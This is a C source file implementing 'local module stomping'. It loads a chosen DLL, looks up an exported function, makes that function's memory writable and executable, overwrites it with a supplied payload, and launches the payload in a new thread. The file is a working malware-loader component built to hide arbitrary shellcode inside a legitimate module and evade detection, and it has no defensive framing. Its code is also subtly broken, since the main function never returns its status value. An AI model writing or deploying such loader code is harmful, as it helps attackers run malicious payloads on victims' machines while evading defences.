#include "LocalStomping.h"

BOOL WritePayload
(
	_In_ PVOID PayloadBuffer,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL State = TRUE;
	DWORD OldProtection = 0;

	if (!VirtualProtect(PayloadBuffer, PayloadSize, PAGE_READWRITE, &OldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Current Memory Protection: PAGE_READWRITE [RW]");

	RtlCopyMemory(PayloadBuffer, Payload, PayloadSize);

	INFO("Wrote %zu Bytes to Remote Module", PayloadSize);

	if (!VirtualProtect(PayloadBuffer, PayloadSize, PAGE_EXECUTE_READWRITE, &OldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Current Memory Protection: PAGE_EXECUTE_READWRITE [RWX]");

_END_FUNC:

	return State;

}

BOOL StompLocalModule
(
	_In_ LPCWSTR TargetDll,
	_In_ LPCSTR TargetDllFunction,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize
)
{

	BOOL State = TRUE;
	HMODULE TargetModule = NULL;
	PVOID PayloadAddress = NULL;
	HANDLE ThreadHandle = NULL;

	if (!(TargetModule = LoadLibraryW(TargetDll)) || TargetModule == NULL)
	{
		WARN("Failed To Load %ls", TargetDll);
		PRINT_ERROR("LoadLibraryW");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Loaded %ls", TargetDll);

	if (!(PayloadAddress = GetProcAddress(TargetModule, TargetDllFunction)) || PayloadAddress == NULL)
	{
		WARN("Failed To Load Function: %s", TargetDllFunction);
		PRINT_ERROR("GetProcAddress");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Loaded Function: %s", TargetDllFunction);

	if (!WritePayload(PayloadAddress, Payload, PayloadSize))
	{
		WARN("Failed To Write Payload!");
		PRINT_ERROR("WritePayload");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Successfully Wrote Payload Address to Target Dll", PayloadAddress);

	if (!(ThreadHandle = CreateThread(NULL, 0, PayloadAddress, NULL, 0, NULL)) || ThreadHandle == NULL)
	{
		WARN("Failed To Create Thread Pointing to Our Payload");
		PRINT_ERROR("CreateRemoteThread");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Thread Created! Pointing to Our Payload", ThreadHandle);
	INFO("Waiting For Thread to Finish Executing...");

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

}